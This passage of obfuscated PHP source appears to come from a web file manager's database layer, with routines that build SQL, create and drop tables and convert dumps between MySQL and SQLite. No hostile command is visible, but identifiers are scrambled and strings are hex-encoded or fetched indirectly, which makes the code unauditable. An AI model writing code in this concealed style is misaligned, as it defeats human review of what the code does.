$éÎÁüç¹[$³‡­â©–[430]]); } else { $ã€ÇİºÉ = $éÎÁüç¹[$³‡­â©–[430]]; } $ã€ÇİºÉ = $ã€ÇİºÉ ? $ã€ÇİºÉ : 1; $Ú…·âô³ = isset($Ú…·âô³) ? $Ú…·âô³ : (is_numeric($éÎÁüç¹[$³‡­â©–[369]]) ? $éÎÁüç¹[$³‡­â©–[369]] : 20); $³¡…Õ±Ô = $Ú…·âô³ * ((int) $ã€ÇİºÉ - 1); $éÎÁüç¹[$³‡­â©–[369]] = $³¡…Õ±Ô . $³‡­â©–[50] . $Ú…·âô³; } if (think_config($³‡­â©–[1118])) { $‰Òü¨Ñ¨ = $³‡­â©–[1119] . md5(serialize($éÎÁüç¹)); $ğ¹Õ €¾ = think_cache($‰Òü¨Ñ¨); if ($ğ¹Õ €¾) { return $ğ¹Õ €¾; } } $Â¢ş¯‚˜ = $this->parseSql($this->selectSql, $éÎÁüç¹); $Â¢ş¯‚˜ .= $this->parseLock(isset($éÎÁüç¹[$³‡­â©–[911]]) ? $éÎÁüç¹[$³‡­â©–[911]] : !1); if (isset($‰Òü¨Ñ¨)) { think_cache($‰Òü¨Ñ¨, $Â¢ş¯‚˜); } return $Â¢ş¯‚˜; } public function parseSql($Î·‰Â, $¨ºƒ¾õ = array()) { $§¸£€¿É =& $_SERVER[Š—Â“œÔ]; $Î·‰Â = str_replace(array($§¸£€¿É[1120], $§¸£€¿É[1121], $§¸£€¿É[1122], $§¸£€¿É[1123], $§¸£€¿É[1124], $§¸£€¿É[1125], $§¸£€¿É[1126], $§¸£€¿É[1127], $§¸£€¿É[1128], $§¸£€¿É[1129], $§¸£€¿É[1130]), array($this->parseTable("{$¨ºƒ¾õ[$§¸£€¿É[358]]}"), $this->parseDistinct(isset($¨ºƒ¾õ[$§¸£€¿É[1131]]) ? $¨ºƒ¾õ[$§¸£€¿É[1131]] : !1), $this->parseField(!empty($¨ºƒ¾õ[$§¸£€¿É[352]]) ? $¨ºƒ¾õ[$§¸£€¿É[352]] : $§¸£€¿É[222]), $this->parseJoin(!empty($¨ºƒ¾õ[$§¸£€¿É[361]]) ? $¨ºƒ¾õ[$§¸£€¿É[361]] : $§¸£€¿É[12]), $this->parseWhere(!empty($¨ºƒ¾õ[$§¸£€¿É[354]]) ? $¨ºƒ¾õ[$§¸£€¿É[354]] : $§¸£€¿É[12]), $this->parseGroup(!empty($¨ºƒ¾õ[$§¸£€¿É[580]]) ? $¨ºƒ¾õ[$§¸£€¿É[580]] : $§¸£€¿É[12]), $this->parseHaving(!empty($¨ºƒ¾õ[$§¸£€¿É[1132]]) ? $¨ºƒ¾õ[$§¸£€¿É[1132]] : $§¸£€¿É[12]), $this->parseOrder(!empty($¨ºƒ¾õ[$§¸£€¿É[443]]) ? $¨ºƒ¾õ[$§¸£€¿É[443]] : $§¸£€¿É[12]), $this->parseLimit(!empty($¨ºƒ¾õ[$§¸£€¿É[369]]) ? $¨ºƒ¾õ[$§¸£€¿É[369]] : $§¸£€¿É[12]), $this->parseUnion(!empty($¨ºƒ¾õ[$§¸£€¿É[424]]) ? $¨ºƒ¾õ[$§¸£€¿É[424]] : $§¸£€¿É[12]), $this->parseComment(!empty($¨ºƒ¾õ[$§¸£€¿É[431]]) ? $¨ºƒ¾õ[$§¸£€¿É[431]] : $§¸£€¿É[12])), $Î·‰Â); return $Î·‰Â; } public function getLastSql($¯ê–¥Í· = '') { return $¯ê–¥Í· ? $this->modelSql[$¯ê–¥Í·] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($îÔ™áøÍ) { return addslashes($îÔ™áøÍ); } public function setModel($Ø×ÜŞÔ) { $this->model = $Ø×ÜŞÔ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($œ—†ä¯¢ = array()) { $ºŞ†˜¨¯ =& $_SERVER[Š—Â“œÔ]; if (empty($œ—†ä¯¢)) { $œ—†ä¯¢ = $GLOBALS[$ºŞ†˜¨¯[6]][$ºŞ†˜¨¯[21]]; } $this->database = $œ—†ä¯¢; } public function model($ÈŠ“ú„» = '') { return new ModelBase($ÈŠ“ú„», $_SERVER[Š—Â“œÔ][12], $this->database); } public function db($Åñùäêº = false) { $×ÆÀ«Î¯ =& $_SERVER[Š—Â“œÔ]; $ÕÁâ™şğ = array_change_key_case($this->database); if ($this->dbType() == $×ÆÀ«Î¯[13] || !$Åñùäêº) { return $this->model()->db(); } $¨İ®º… = $ÕÁâ™şğ[$×ÆÀ«Î¯[1046]]; $ÕÁâ™şğ[$×ÆÀ«Î¯[1046]] = $×ÆÀ«Î¯[12]; if ($ÕÁâ™şğ[$×ÆÀ«Î¯[1041]] == $×ÆÀ«Î¯[1038]) { $É°„×øó = $ÕÁâ™şğ[$×ÆÀ«Î¯[1047]]; $ÕÁâ™şğ[$×ÆÀ«Î¯[1047]] = substr($É°„×øó, 0, strrpos($É°„×øó, $×ÆÀ«Î¯[1133])); } $this->database = $ÕÁâ™şğ; $¢Ã›Áë¼ = $this->model()->db(); try { $ç¨ÅÈ = $¢Ã›Áë¼->execute("\x73\150\157\x77\x20\144\x61\x74\141\142\x61\x73\145\163\x20\154\151\153\x65\40\x27{$¨İ®º…}\x27"); } catch (Exception $Œ…à¥€¿) { } if (!$ç¨ÅÈ) { $¢Ã›Áë¼->execute("\143\x72\145\141\164\x65\x20\144\141\x74\141\142\x61\x73\x65\40\140{$¨İ®º…}\140"); } $ÕÁâ™şğ[$×ÆÀ«Î¯[1046]] = $¨İ®º…; if ($ÕÁâ™şğ[$×ÆÀ«Î¯[1041]] == $×ÆÀ«Î¯[1038]) { $ÕÁâ™şğ[$×ÆÀ«Î¯[1047]] .= $×ÆÀ«Î¯[1133] . $¨İ®º…; } $this->database = $ÕÁâ™şğ; $¢Ã›Áë¼->execute("\x75\163\145\40\140{$¨İ®º…}\x60"); return $¢Ã›Áë¼; } public function createTable($ö÷¡ëâÌ, &$ïª©äÂ) { $¯˜±ääÉ =& $_SERVER[Š—Â“œÔ]; if (!IO::exist($ö÷¡ëâÌ)) { ActionCall($¯˜±ääÉ[1134], !0, 0); show_json(LNG($¯˜±ääÉ[1135]), !1); } $¤²Ï‹ËÆ = $this->model()->db(); $Ôûº’ô´ = sqlSplit(IO::getContent($ö÷¡ëâÌ)); foreach ($Ôûº’ô´ as $ˆõ‡èÂÊ) { $¸ÒÒÓ = stripos($ˆõ‡èÂÊ, $¯˜±ääÉ[1136]) === 0; if ($¸ÒÒÓ) { $ïª©äÂ->task[$¯˜±ääÉ[1137]] += 1; } $¤²Ï‹ËÆ->execute($ˆõ‡èÂÊ); if ($¸ÒÒÓ) { preg_match($¯˜±ääÉ[1138], $ˆõ‡èÂÊ, $é”Â®Ó·); $ïª©äÂ->task[$¯˜±ääÉ[1139]] = $é”Â®Ó·[1]; $ïª©äÂ->update(1); } } } public function insertTable($‰Ï¨‚ËÎ, &$Ü“ıŸ÷) { $­Ú¬¨× =& $_SERVER[Š—Â“œÔ]; $óµÍ ã = $this->model()->db(); $œÑ·¤í’ = $Ëƒ§©áŒ ? array($Ëƒ§©áŒ) : $óµÍ ã->getTables(); foreach ($‰Ï¨‚ËÎ as $¤â×¼öì) { $Ëƒ§©áŒ = basename($¤â×¼öì, $­Ú¬¨×[856]); if (!in_array($Ëƒ§©áŒ, $œÑ·¤í’)) { continue; } $Ü“ıŸ÷->task[$­Ú¬¨×[1139]] = $Ëƒ§©áŒ; if (get_filesize($¤â×¼öì) == 0) { continue; } $ª²ê„”À = $this->sqlToDb($¤â×¼öì, $Ü“ıŸ÷); if (!$ª²ê„”À) { ActionCall($­Ú¬¨×[1134], !0, 0); show_json(LNG($­Ú¬¨×[1140]) . "\x5b{$Ëƒ§©áŒ}\x5d", !1); } } } public function sqlFromDb($Èßò•Áˆ, $¦ù”‰Ê–, &$Ñ½ÎÒøò, $Äİ°Ùš = '') { if ($Ñ½ÎÒøò) { $Ñ½ÎÒøò->task[$_SERVER[Š—Â“œÔ][1139]] = $Èßò•Áˆ; } $ûñ§äœö = $this->model($Èßò•Áˆ); $¥äø™Óş = 0; $¯üâØ™ = 0; $ñ’¯óâä = 10000; $»”„Ç— = fopen($¦ù”‰Ê–, $_SERVER[Š—Â“œÔ][1141]); $ü‰Û™ªï = $ûñ§äœö->getPk(); $–£êä›á = $ûñ§äœö->getDbFields(); $ì‘ßÊÂ¸ = $_SERVER[Š—Â“œÔ][12]; if ($GLOBALS[$_SERVER[Š—Â“œÔ][855]] && in_array($Èßò•Áˆ, array($_SERVER[Š—Â“œÔ][1142], $_SERVER[Š—Â“œÔ][1143]))) { $ì‘ßÊÂ¸ = $Èßò•Áˆ; } do { $¾Ò–°Ü = array($ü‰Û™ªï => array($_SERVER[Š—Â“œÔ][1088], $¯üâØ™)); $î•úª¯ = $ûñ§äœö->where($¾Ò–°Ü)->field($–£êä›á)->order($ü‰Û™ªï . $_SERVER[Š—Â“œÔ][1144])->limit($ñ’¯óâä)->select(); $î•úª¯ = !empty($î•úª¯) ? $î•úª¯ : array(); if (!($‹Ö˜ñŸë = count($î•úª¯))) { break; } $ÌËŸ¶’À = end($î•úª¯); $¯üâØ™ = $ÌËŸ¶’À[$ü‰Û™ªï]; $ş‹É„é = array(); foreach ($î•úª¯ as $ÕŸÅ˜õ) { if ($ì‘ßÊÂ¸) { if ($Èßò•Áˆ == $_SERVER[Š—Â“œÔ][1142]) { if ($ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][33]] == $_SERVER[Š—Â“œÔ][1145]) { $ä‰´úª¡ = json_decode($ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][452]], !0); if ($ä‰´úª¡[$_SERVER[Š—Â“œÔ][32]] == $GLOBALS[$_SERVER[Š—Â“œÔ][855]] && $ä‰´úª¡[$_SERVER[Š—Â“œÔ][817]] != 1) { continue; } } } else { if ($ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][33]] == $_SERVER[Š—Â“œÔ][1146] && $ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][97]] == $_SERVER[Š—Â“œÔ][850]) { continue; } } } if ($Äİ°Ùš) { $ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][87]] = "\x7b\x69\x6f\x3a{$Äİ°Ùš}\175" . substr($ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][87]], strlen("\x7b\x69\x6f\72{$ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][885]]}\x7d")); $ÕŸÅ˜õ[$_SERVER[Š—Â“œÔ][885]] = $Äİ°Ùš; } $ş‹É„é[] = $_SERVER[Š—Â“œÔ][1147] . $this->sqlEncode($ÕŸÅ˜õ) . $_SERVER[Š—Â“œÔ][1148]; } $½ã¨áÏ = "\x49\116\x53\105\x52\x54\x20\111\x4e\x54\117\40\x60{$Èßò•Áˆ}\x60\40\50\x60" . implode($_SERVER[Š—Â“œÔ][1149], $–£êä›á) . $_SERVER[Š—Â“œÔ][1150]; fwrite($»”„Ç—, $½ã¨áÏ . implode($_SERVER[Š—Â“œÔ][1151], $ş‹É„é) . $_SERVER[Š—Â“œÔ][74] . PHP_EOL); $¥äø™Óş += $‹Ö˜ñŸë; if ($Ñ½ÎÒøò) { $Ñ½ÎÒøò->update($‹Ö˜ñŸë); } } while ($ñ’¯óâä == $‹Ö˜ñŸë); fclose($»”„Ç—); return $¥äø™Óş; } public function sqlToDb($Ò»£¿¨Â, &$Ûñ«¶Ë) { $¦Á×Ãä™ =& $_SERVER[Š—Â“œÔ]; $ö†Œ›ù² = $this->model()->db(); $´¶»ú¡§ = @fopen($Ò»£¿¨Â, $¦Á×Ãä™[1152]); if (!$´¶»ú¡§) { return !1; } $ù†ñºñ¦ = 0; $ˆø¨âßô = $¦Á×Ãä™[12]; $á™ÖŒĞÙ = array(); $¶ºšìÓô = $this->dbType(); $é½ñÃÑñ = $¶ºšìÓô == $¦Á×Ãä™[13] ? 500 : 2000; $é°…†¿§ = basename($Ò»£¿¨Â, $¦Á×Ãä™[856]); $±üï¯â = 0; $°¶üÎ• = 4194304; while (!feof($´¶»ú¡§)) { $¶‡•÷»Ä = trim(fgets($´¶»ú¡§)); if (!$¶‡•÷»Ä) { continue; } $­İÅÒÚû = $this->sqlDecode($¶‡•÷»Ä, $¶ºšìÓô, $é°…†¿§); if (stripos($­İÅÒÚû, $¦Á×Ãä™[432]) === 0) { if (!$ˆø¨âßô) { $ˆø¨âßô = $­İÅÒÚû . $¦Á×Ãä™[53]; } continue; } if ($Ûñ«¶Ë) { $Ûñ«¶Ë->task[$¦Á×Ãä™[1137]] += 1; } $ù†ñºñ¦++; $á™ÖŒĞÙ[] = rtrim(rtrim(trim($­İÅÒÚû), $¦Á×Ãä™[50]), $¦Á×Ãä™[74]); $İ®•‘É¬ = null; $Ê•ãèéé = strlen($­İÅÒÚû); $±üï¯â += $Ê•ãèéé; $Í‚”•¨‹ = strlen($ˆø¨âßô) + $±üï¯â + (count($á™ÖŒĞÙ) - 1); if ($Í‚”•¨‹ >= $°¶üÎ•) { $İ®•‘É¬ = array_pop($á™ÖŒĞÙ); if ($ù†ñºñ¦ > 1) { $ù†ñºñ¦--; } } if ($ù†ñºñ¦ >= $é½ñÃÑñ || $İ®•‘É¬) { $­İÅÒÚû = $ˆø¨âßô . implode($¦Á×Ãä™[50], $á™ÖŒĞÙ); if (!$ö†Œ›ù²->execute($­İÅÒÚû)) { return !1; } if ($Ûñ«¶Ë) { $Ûñ«¶Ë->update($ù†ñºñ¦); } $á™ÖŒĞÙ = array(); $ù†ñºñ¦ = 0; $±üï¯â = 0; if ($İ®•‘É¬) { $á™ÖŒĞÙ = array($İ®•‘É¬); $ù†ñºñ¦ = 1; $±üï¯â = $Ê•ãèéé; } } } fclose($´¶»ú¡§); if (!empty($á™ÖŒĞÙ)) { $­İÅÒÚû = $ˆø¨âßô . implode($¦Á×Ãä™[50], $á™ÖŒĞÙ); if (!$ö†Œ›ù²->execute($­İÅÒÚû)) { return !1; } if ($Ûñ«¶Ë) { $Ûñ«¶Ë->update($ù†ñºñ¦); } } return !0; } public function dropTable($«»İÃÅ = null) { $ƒİ˜­àà = $this->model()->db(); $ÆÖÛãÏ® = $«»İÃÅ ? array($«»İÃÅ) : $ƒİ˜­àà->getTables(); if (!$ÆÖÛãÏ®) { return; } foreach ($ÆÖÛãÏ® as $«»İÃÅ) { if ($«»İÃÅ) { $«»İÃÅ = strtolower($«»İÃÅ); } else { continue; } $ƒİ˜­àà->execute("\x64\x72\157\160\x20\x74\141\142\x6c\x65\40\x69\x66\x20\145\170\151\x73\164\x73\x20\x60{$«»İÃÅ}\x60"); } } private function sqlEncode($óÑœìÆÑ) { $Åüäè•Ö =& $_SERVER[Š—Â“œÔ]; $ÙÃœË¢¢ = array(); foreach ($óÑœìÆÑ as $”Œ¾Äå„) { if (is_array($”Œ¾Äå„)) { $”Œ¾Äå„ = json_encode_force($”Œ¾Äå„); } $”Œ¾Äå„ = addslashes($”Œ¾Äå„); $”Œ¾Äå„ = str_replace(array($Åüäè•Ö[1153], $Åüäè•Ö[287], $Åüäè•Ö[419]), array($Åüäè•Ö[1154], $Åüäè•Ö[1155], $Åüäè•Ö[1156]), $”Œ¾Äå„); $ÙÃœË¢¢[] = $”Œ¾Äå„; } return $Åüäè•Ö[58] . implode($Åüäè•Ö[1157], $ÙÃœË¢¢) . $Åüäè•Ö[58]; } private function sqlDecode($±ŸûÆ–, $„®„†É, $Ï‚éáí™ = '') { $ğ¸¾‘Ñµ =& $_SERVER[Š—Â“œÔ]; $±ŸûÆ– = str_replace(array($ğ¸¾‘Ñµ[1154], $ğ¸¾‘Ñµ[1155], $ğ¸¾‘Ñµ[1156]), array($ğ¸¾‘Ñµ[1153], $ğ¸¾‘Ñµ[287], $ğ¸¾‘Ñµ[419]), $±ŸûÆ–); if ($„®„†É == $ğ¸¾‘Ñµ[13]) { $±ŸûÆ– = str_ireplace($ğ¸¾‘Ñµ[1158], $ğ¸¾‘Ñµ[59], $±ŸûÆ–); $±ŸûÆ– = stripslashes($±ŸûÆ–); } return preg_replace($ğ¸¾‘Ñµ[1159], $ğ¸¾‘Ñµ[12], $±ŸûÆ–); if ($„®„†É == $ğ¸¾‘Ñµ[13]) { return $Ï‚éáí™ != $ğ¸¾‘Ñµ[849] ? stripslashes($±ŸûÆ–) : $±ŸûÆ–; } if ($Ï‚éáí™ == $ğ¸¾‘Ñµ[849]) { $±ŸûÆ– = str_replace($ğ¸¾‘Ñµ[1160], $ğ¸¾‘Ñµ[121], stripslashes($±ŸûÆ–)); } return $±ŸûÆ–; } public function getSqlFile($¼ü€‘šÍ = '') { $ıóÊÚ =& $_SERVER[Š—Â“œÔ]; $¨×ºù„ = $this->dbType(!0); $ôĞä¹‹ë = CONTROLLER_DIR . "\151\x6e\x73\164\141\x6c\154\x2f\x64\x61\x74\141\x2f{$¨×ºù„}\56\x73\161\154"; $ïà¹˜ñà = file_get_contents($ôĞä¹‹ë); $áÇ‚ÎïÅ = $ıóÊÚ[1161] . ($¨×ºù„ == $ıóÊÚ[872] ? $ıóÊÚ[1162] : $ıóÊÚ[1163]) . $ıóÊÚ[1164]; preg_match_all($áÇ‚ÎïÅ, $ïà¹˜ñà, $ƒ¸ÕäÚÊ); $ôÉ¹ÑÁ† = $ƒ¸ÕäÚÊ[1]; $Õ¨Å“á÷ = $this->model()->db(); $ë­ûüá = $Õ¨Å“á÷->getTables(); $„ª—ï Æ = TEMP_FILES . $ıóÊÚ[1165] . date($ıóÊÚ[261]) . $ıóÊÚ[8]; del_dir($„ª—ï Æ); mk_dir($„ª—ï Æ); $ıÉ°ç¸ = $„ª—ï Æ . $ıóÊÚ[1166]; $œíˆ¨â = $„ª—ï Æ . $ıóÊÚ[1167]; $ùÁ’‘ÔÌ = $¨×ºù„ == $ıóÊÚ[13] ? $ıóÊÚ[872] : $ıóÊÚ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\x6c\57\144\141\x74\x61\x2f{$ùÁ’‘ÔÌ}\x2e\163\x71\154", $„ª—ï Æ); @touch($„ª—ï Æ . $¨×ºù„ . $ıóÊÚ[856]); $Û†×é¢È = fopen($ıÉ°ç¸, $ıóÊÚ[1141]); $È÷¦¢áº = fopen($œíˆ¨â, $ıóÊÚ[1141]); if ($¨×ºù„ == $ıóÊÚ[13]) { $ë­ûüá = array_diff($ë­ûüá, array($ıóÊÚ[847], $ıóÊÚ[848])); $à§¿óì = array($ıóÊÚ[1168], $ıóÊÚ[1169], $ıóÊÚ[1170]); fwrite($È÷¦¢áº, implode(PHP_EOL, $à§¿óì) . PHP_EOL . PHP_EOL); foreach ($ë­ûüá as $°•¿Æ‡€) { $½Ö×çéˆ = $this->sqlFromSqlite($°•¿Æ‡€); if (!$½Ö×çéˆ[$ıóÊÚ[13]]) { continue; } fwrite($È÷¦¢áº, $½Ö×çéˆ[$ıóÊÚ[13]] . PHP_EOL . PHP_EOL); if (!in_array($°•¿Æ‡€, $ôÉ¹ÑÁ†)) { fwrite($Û†×é¢È, $½Ö×çéˆ[$ıóÊÚ[872]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ë­ûüá as $°•¿Æ‡€) { $½Ö×çéˆ = $this->sqlFromMysql($°•¿Æ‡€); if (!$½Ö×çéˆ[$ıóÊÚ[872]]) { continue; } fwrite($Û†×é¢È, $½Ö×çéˆ[$ıóÊÚ[872]] . PHP_EOL . PHP_EOL); if (!in_array($°•¿Æ‡€, $ôÉ¹ÑÁ†)) { fwrite($È÷¦¢áº, $½Ö×çéˆ[$ıóÊÚ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Û†×é¢È); fclose($È÷¦¢áº); $ïà¹˜ñà = array($ıóÊÚ[872] => $ıÉ°ç¸, $ıóÊÚ[13] => $œíˆ¨â); return $¼ü€‘šÍ ? $ïà¹˜ñà[$¼ü€‘šÍ] : $ïà¹˜ñà; } public function dbType($®Õßƒ¡ë = false) { $…ò¤ñ¤Ô =& $_SERVER[Š—Â“œÔ]; $­ô„è‡Ü = $®Õßƒ¡ë ? $GLOBALS[$…ò¤ñ¤Ô[6]][$…ò¤ñ¤Ô[21]] : $this->database; $­ô„è‡Ü = array_change_key_case($­ô„è‡Ü); $ÕÅ˜É½ = $­ô„è‡Ü[$…ò¤ñ¤Ô[1041]]; if ($ÕÅ˜É½ == $…ò¤ñ¤Ô[1038]) { $â—³ÂÉ = explode($…ò¤ñ¤Ô[4], $­ô„è‡Ü[$…ò¤ñ¤Ô[1047]]); $ÕÅ˜É½ = $â—³ÂÉ[0]; } $œÌÌí¬æ = array($…ò¤ñ¤Ô[1171] => $…ò¤ñ¤Ô[13], $…ò¤ñ¤Ô[986] => $…ò¤ñ¤Ô[872]); if (isset($œÌÌí¬æ[$ÕÅ˜É½])) { $ÕÅ˜É½ = $œÌÌí¬æ[$ÕÅ˜É½]; } return $ÕÅ˜É½; } public function sqlFromMysql($“º¨¿ó¯, $½ø«ôî = '') { $¨¾ûªòî =& $_SERVER[Š—Â“œÔ]; $ëĞ­ëí• = $this->model()->db(); $—–‰‡Ö = $ëĞ­ëí•->query($¨¾ûªòî[1172] . $“º¨¿ó¯ . $¨¾ûªòî[463]); if (!$—–‰‡Ö || !$—–‰‡Ö[0]) { return !1; } $ù¾ŞÚ‘Ë = _get($—–‰‡Ö[0], $¨¾ûªòî[1173], $¨¾ûªòî[12]); if (!$ù¾ŞÚ‘Ë) { return !1; } $õßÉ­Ö• = "\x44\x52\117\120\x20\124\101\x42\x4c\x45\40\111\106\40\105\130\111\x53\x54\x53\x20\x60{$“º¨¿ó¯}\140\x3b" . PHP_EOL . $ù¾ŞÚ‘Ë . $¨¾ûªòî[74]; if ($½ø«ôî && $½ø«ôî == $¨¾ûªòî[872]) { return $õßÉ­Ö•; } $üØ„Ì¡¥ = array_change_key_case($GLOBALS[$¨¾ûªòî[6]][$¨¾ûªòî[21]]); $ŒíäêÃ = $üØ„Ì¡¥[$¨¾ûªòî[1046]]; $‹ĞÂŸõ¸ = $¨¾ûªòî[1174] . $ŒíäêÃ . $¨¾ûªòî[1175] . $“º¨¿ó¯ . $¨¾ûªòî[58]; $ÆŸ›­¯ = $¨¾ûªòî[1176] . $“º¨¿ó¯ . $¨¾ûªòî[974]; $§’ôô = $ëĞ­ëí•->query($‹ĞÂŸõ¸); if (empty($§’ôô)) { $Ô—İóƒ = array($¨¾ûªòî[872] => $¨¾ûªòî[12], $¨¾ûªòî[13] => $¨¾ûªòî[12]); return $½ø«ôî ? $Ô—İóƒ[$½ø«ôî] : $Ô—İóƒ; } $†ĞæÍù¾ = $ëĞ­ëí•->query($ÆŸ›­¯); $Ö—ƒÁÙÉ = $¨¾ûªòî[12]; $Æâ¨ƒ— = array(); foreach ($†ĞæÍù¾ as $Ó«³¸²º) { if (!$Ö—ƒÁÙÉ && $Ó«³¸²º[$¨¾ûªòî[1177]] == $¨¾ûªòî[1178]) { $Ö—ƒÁÙÉ = $Ó«³¸²º[$¨¾ûªòî[1179]]; } if (isset($Æâ¨ƒ—[$Ó«³¸²º[$¨¾ûªòî[1177]]])) { $Æâ¨ƒ—[$Ó«³¸²º[$¨¾ûªòî[1177]]][$¨¾ûªòî[1180]][] = $Ó«³¸²º[$¨¾ûªòî[1179]]; continue; } $Æâ¨ƒ—[$Ó«³¸²º[$¨¾ûªòî[1177]]] = array($¨¾ûªòî[1181] => $Ó«³¸²º[$¨¾ûªòî[1177]], $¨¾ûªòî[1180] => array($Ó«³¸²º[$¨¾ûªòî[1179]]), $¨¾ûªòî[1182] => $Ó«³¸²º[$¨¾ûªòî[1183]] == $¨¾ûªòî[91] ? 0 : 1); } $‡à„åˆ¶ = array(); foreach ($Æâ¨ƒ— as $Ó«³¸²º) { $ÄñÃ«¦ñ = $Ó«³¸²º[$¨¾ûªòî[1181]] == $¨¾ûªòî[1178]; $ôÄû¥ˆ = array($¨¾ûªòî[1184], $Ó«³¸²º[$¨¾ûªòî[1182]] == $¨¾ûªòî[91] && !$ÄñÃ«¦ñ ? $¨¾ûªòî[1185] : $¨¾ûªòî[12], $¨¾ûªòî[1186], $¨¾ûªòî[1187] . $“º¨¿ó¯ . $¨¾ûªòî[11] . ($ÄñÃ«¦ñ ? $¨¾ûªòî[1188] : $Ó«³¸²º[$¨¾ûªòî[1181]]) . $¨¾ûªòî[121], $¨¾ûªòî[1189], $¨¾ûªòî[121] . $“º¨¿ó¯ . $¨¾ûªòî[121], $¨¾ûªòî[1190] . implode($¨¾ûªòî[1191], $Ó«³¸²º[$¨¾ûªòî[1180]]) . $¨¾ûªòî[1192]); $‡à„åˆ¶[] = implode($¨¾ûªòî[53], $ôÄû¥ˆ) . $¨¾ûªòî[74]; } $Á˜ªàïı = array(); $ãó¼Õ = array($¨¾ûªòî[1193] => $¨¾ûªòî[1194], $¨¾ûªòî[1194] => $¨¾ûªòî[1194], $¨¾ûªòî[365] => $¨¾ûªòî[392], $¨¾ûªòî[364] => $¨¾ûªòî[392]); foreach ($§’ôô as $Ó«³¸²º) { $ôÄû¥ˆ = array($¨¾ûªòî[121] . $Ó«³¸²º[$¨¾ûªòî[1195]] . $¨¾ûªòî[121], isset($ãó¼Õ[$Ó«³¸²º[$¨¾ûªòî[1196]]]) ? $ãó¼Õ[$Ó«³¸²º[$¨¾ûªòî[1196]]] : $Ó«³¸²º[$¨¾ûªòî[1197]], $Ó«³¸²º[$¨¾ûªòî[1198]] == $¨¾ûªòî[972] ? $¨¾ûªòî[1199] : $¨¾ûªòî[1200], $Ó«³¸²º[$¨¾ûªòî[1195]] == $Ö—ƒÁÙÉ ? $¨¾ûªòî[1201] : $¨¾ûªòî[12], $Ó«³¸²º[$¨¾ûªòî[1023]] ? strtoupper(str_replace($¨¾ûªòî[11], $¨¾ûªòî[12], $Ó«³¸²º[$¨¾ûªòî[1023]])) : $¨¾ûªòî[12]); $Á˜ªàïı[] = trim(implode($¨¾ûªòî[53], $ôÄû¥ˆ)); } $”ıü¦œ = array($¨¾ûªòî[1202] . $“º¨¿ó¯ . $¨¾ûªòî[1203], $¨¾ûªòî[1204] . $“º¨¿ó¯ . $¨¾ûªòî[1205], implode($¨¾ûªòî[50] . PHP_EOL, $Á˜ªàïı), $¨¾ûªòî[1020]); $½„ÏÄ = implode(PHP_EOL, array_merge($”ıü¦œ, $‡à„åˆ¶)); if ($½ø«ôî && $½ø«ôî == $¨¾ûªòî[13]) { return $½„ÏÄ; } $Ô—İóƒ = array($¨¾ûªòî[872] => $õßÉ­Ö•, $¨¾ûªòî[13] => $½„ÏÄ); return $½ø«ôî ? $Ô—İóƒ[$½ø«ôî] : $Ô—İóƒ; } public function sqlFromSqlite($ÂÕãş’©, $¤Ê«°À = '') { $Ô‘úÏæ =& $_SERVER[Š—Â“œÔ]; $ñõ³Ê¯ = $this->model()->db(); $Ãñ÷½™« = "\x50\122\x41\107\x4d\101\40\124\101\x42\114\x45\x5f\x49\116\x46\x4f\x20\50\47{$ÂÕãş’©}\47\51"; $ºŞ—„Ïş = "\123\105\114\105\103\x54\x20\x2a\40\106\x52\117\115\x20\163\161\154\x69\x74\x65\137\x6d\x61\x73\x74\145\x72\40\x57\x48\x45\122\105\x20\164\x62\154\x5f\156\141\155\x65\x20\75\40\x27{$ÂÕãş’©}\47"; $â¿«Œ‹¨ = $ñõ³Ê¯->query($Ãñ÷½™«); if (empty($â¿«Œ‹¨)) { $æõ¾¬ùô = array($Ô‘úÏæ[872] => $Ô‘úÏæ[12], $Ô‘úÏæ[13] => $Ô‘úÏæ[12]); return $¤Ê«°À ? $æõ¾¬ùô[$¤Ê«°À] : $æõ¾¬ùô; } $Œ»Ó¡ïÈ = $ñõ³Ê¯->query($ºŞ—„Ïş); $úçÜÀª¢ = $æê‚‡ö² = array(); foreach ($Œ»Ó¡ïÈ as $Ú¿ºš…Š) { if ($Ú¿ºš…Š[$Ô‘úÏæ[33]] == $Ô‘úÏæ[358]) { $úçÜÀª¢[] = $Ú¿ºš…Š[$Ô‘úÏæ[1206]]; } else { $æê‚‡ö²[$Ú¿ºš…Š[$Ô‘úÏæ[32]]] = $Ú¿ºš…Š[$Ô‘úÏæ[1206]]; } } $İ›ç®€² = array_merge(array($Ô‘úÏæ[1202] . $ÂÕãş’© . $Ô‘úÏæ[121]), $úçÜÀª¢, array_values($æê‚‡ö²)); $İ›ç®€² = implode($Ô‘úÏæ[74] . PHP_EOL, $İ›ç®€²) . $Ô‘úÏæ[74]; if ($¤Ê«°À && $¤Ê«°À == $Ô‘úÏæ[13]) { return $İ›ç®€²; } $€ıéøìè = array(); foreach ($æê‚‡ö² as $•‡¢â»Ö => $ı‰ğÚŒ˜) { $Á°Ï¹Í¥ = str_replace($Ô‘úÏæ[1207] . $ÂÕãş’© . $Ô‘úÏæ[11], $Ô‘úÏæ[12], $•‡¢â»Ö); $Á°Ï¹Í¥ = str_replace($ÂÕãş’© . $Ô‘úÏæ[11], $Ô‘úÏæ[12], $•‡¢â»Ö); $–»Ò„€ä = str_replace(array($Ô‘úÏæ[121], $Ô‘úÏæ[1031]), $Ô‘úÏæ[463], substr($ı‰ğÚŒ˜, stripos($ı‰ğÚŒ˜, $Ô‘úÏæ[339]))); $€ıéøìè[$Á°Ï¹Í¥] = $–»Ò„€ä; } $…ÔÇôŒà = array(); $ÚŸè‚à‡ = array($Ô‘úÏæ[1194] => $Ô‘úÏæ[1208], $Ô‘úÏæ[392] => $Ô‘úÏæ[1209]); $ŸŒÜ‰‘ = $Æâ³‡¥ê = $Ô‘úÏæ[12]; foreach ($â¿«Œ‹¨ as $Ú¿ºš…Š) { if 